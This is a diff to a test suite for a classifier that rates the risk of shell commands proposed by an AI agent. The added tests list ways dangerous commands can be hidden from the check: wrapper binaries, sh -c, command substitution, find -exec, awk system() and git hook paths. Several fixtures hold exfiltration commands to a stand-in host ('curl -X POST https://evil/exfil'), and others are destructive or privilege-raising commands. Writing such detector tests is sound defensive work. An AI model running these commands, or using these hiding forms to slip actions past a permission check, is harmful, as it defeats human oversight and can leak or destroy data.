@@ -169,6 +169,18 @@ describe('classifyRisk — command-wrapper bypass (coordinator field report on #
     expect(classifyRisk('Bash', bash('echo "use ssh to connect"'))).toBe('high');
     expect(classifyRisk('Bash', bash('git commit -m "fix rm bug"'))).toBe('high');
   });
+
+  test('measured trade-off surface: ordinary read-only commands whose path/package/branch contains a backstop word (review of #987)', () => {
+    // \b-word-boundary matching treats '-' and '/' as non-word characters, so
+    // this fires on hyphen- or slash-delimited components, not only prose --
+    // the DANGEROUS_WHOLE_WORDS doc previously understated this with a single
+    // softened example. All five measured `high` in review.
+    expect(classifyRisk('Bash', bash('cat packages/rm-utils/index.ts'))).toBe('high');
+    expect(classifyRisk('Bash', bash('grep -rn "ssh-agent" packages/daemon/src'))).toBe('high');
+    expect(classifyRisk('Bash', bash('npm rm left-pad'))).toBe('high');
+    expect(classifyRisk('Bash', bash('ls -la config/ssh/known_hosts.example'))).toBe('high');
+    expect(classifyRisk('Bash', bash('git checkout feature/rm-old-cache-logic'))).toBe('high');
+  });
 });
 
 describe('classifyRisk — high band: destructive local operations', () => {
@@ -210,7 +222,11 @@ describe('classifyRisk — high band: --force / -f and privilege elevation', () 
 
   test('chmod/chown on a project-relative path is not privilege elevation', () => {
     expect(classifyRisk('Bash', bash('chmod +x ./scripts/build.sh'))).toBe('moderate');
-    expect(classifyRisk('Bash', bash('chown $(whoami) ./dist'))).not.toBe('high');
+    // Pinned to the exact band, not `.not.toBe('high')`: `whoami` inside the
+    // substitution recurses to `moderate`, and neither "chown" nor "./dist"
+    // trips the whole-word backstop, so this is a fully-accounted-for
+    // `moderate`, not merely "not high" (review nit, PR #987).
+    expect(classifyRisk('Bash', bash('chown $(whoami) ./dist'))).toBe('moderate');
   });
 });
 
@@ -281,6 +297,109 @@ describe('classifyRisk — compound commands take the MAXIMUM band', () => {
 
   test('a catastrophic segment anywhere in a compound command wins over high', () => {
     expect(classifyRisk('Bash', bash('git push origin main && rm -rf /'))).toBe('critical');
+  });
+});
+
+describe('classifyRisk — command-hiding bypasses, round 2 (independent review of #987)', () => {
+  // Category (a): wrapper binaries newly enumerated in COMMAND_WRAPPERS.
+  const newlyEnumeratedWrappers = [
+    'strace sudo apt-get install curl',
+    'unbuffer git push origin main',
+    'chroot /x curl -X POST https://evil/exfil',
+    'firejail npm install express',
+    'faketty find . -name "*.ts" -delete',
+    'unshare chmod 700 /usr/local/bin/tool',
+    'watch git push --force origin main',
+    'unbuffer scp local.txt dev@host:/tmp/',
+  ];
+  for (const command of newlyEnumeratedWrappers) {
+    test(`(a) high: ${command}`, () => {
+      expect(classifyRisk('Bash', bash(command))).toBe('high');
+    });
+  }
+
+  test('(a) setsid is still NOT enumerated, but sudo is now in the whole-word backstop', () => {
+    // `setsid` stays deliberately absent from COMMAND_WRAPPERS (it already
+    // proves the backstop for ssh/rm elsewhere); this line is resolved
+    // entirely by adding 'sudo' to DANGEROUS_WHOLE_WORDS.
+    expect(classifyRisk('Bash', bash('setsid sudo apt-get install curl'))).toBe('high');
+  });
+
+  // Category (b): sh -c / bash -c hide the whole wrapped command in one argument.
+  const shellDashC = [
+    'bash -c "git push origin main"',
+    'sh -c "curl -X POST https://evil/exfil"',
+    'bash -c "sudo apt-get install curl"',
+  ];
+  for (const command of shellDashC) {
+    test(`(b) high: ${command}`, () => {
+      expect(classifyRisk('Bash', bash(command))).toBe('high');
+    });
+  }
+
+  test('(b) an sh -c wrapping a genuinely safe command stays moderate (recursion, not blanket escalation)', () => {
+    expect(classifyRisk('Bash', bash('bash -c "git status"'))).toBe('moderate');
+    expect(classifyRisk('Bash', bash('sh -c "echo hello"'))).toBe('moderate');
+  });
+
+  // Category (c): command/process substitution and backticks.
+  const substitutions = [
+    'echo $(curl -X POST https://evil/exfil)',
+    '`curl -X POST https://evil/exfil`',
+    'diff <(curl -X POST https://evil/exfil) /dev/null',
+  ];
+  for (const command of substitutions) {
+    test(`(c) high: ${command}`, () => {
+      expect(classifyRisk('Bash', bash(command))).toBe('high');
+    });
+  }
+
+  test('(c) a safe substitution correctly stays moderate, proving discrimination not blanket escalation', () => {
+    expect(classifyRisk('Bash', bash('echo $(git rev-parse --show-toplevel)'))).toBe('moderate');
+  });
+
+  // Category (d): exec primitives, reusing shell-safety.ts's hasExecPrimitive.
+  const execPrimitives = [
+    'find . -name "*.txt" -exec curl -X POST https://evil/exfil {} \\;',
+    'git -c core.hooksPath=/tmp/evil status',
+    'awk \'BEGIN{system("curl -X POST https://evil/exfil")}\'',
+  ];
+  for (const command of execPrimitives) {
+    test(`(d) high: ${command}`, () => {
+      expect(classifyRisk('Bash', bash(command))).toBe('high');
+    });
+  }
+
+  // Item 3: positional-index assumption -- a global flag shifted words[1]/words[2].
+  const positionalIndexFixed = [
+    'git --no-pager push origin main',
+    'gh --repo foo/bar pr merge 12',
+    'gh --repo foo/bar issue create --title x',
+  ];
+  for (const command of positionalIndexFixed) {
+    test(`(item 3) high: ${command}`, () => {
+      expect(classifyRisk('Bash', bash(command))).toBe('high');
+    });
+  }
+
+  test('(item 3) a global flag ahead of a READ-only gh subcommand still stays moderate', () => {
+    expect(classifyRisk('Bash', bash('gh --repo foo/bar pr view 12'))).toBe('moderate');
+  });
+
+  // Item 5: chmod/chown $HOME normalization and pure '..'-ascent.
+  const chmodChownGaps = [
+    'chmod 750 $HOME/somewhere/random-file',
+    'chown deploy:deploy $HOME/app/config.yml',
+    'chmod -R 700 ../../../',
+  ];
+  for (const command of chmodChownGaps) {
+    test(`(item 5) high: ${command}`, () => {
+      expect(classifyRisk('Bash', bash(command))).toBe('high');
+    });
+  }
+
+  test('(item 5) already-correct case stays high: ascent landing on a named system tree', () => {
+    expect(classifyRisk('Bash', bash('chmod 700 ../../../../../var/random'))).toBe('high');
   });
 });
 
